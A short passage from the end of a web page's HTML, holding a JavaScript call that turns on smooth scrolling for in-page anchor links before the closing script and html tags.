  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>





</html>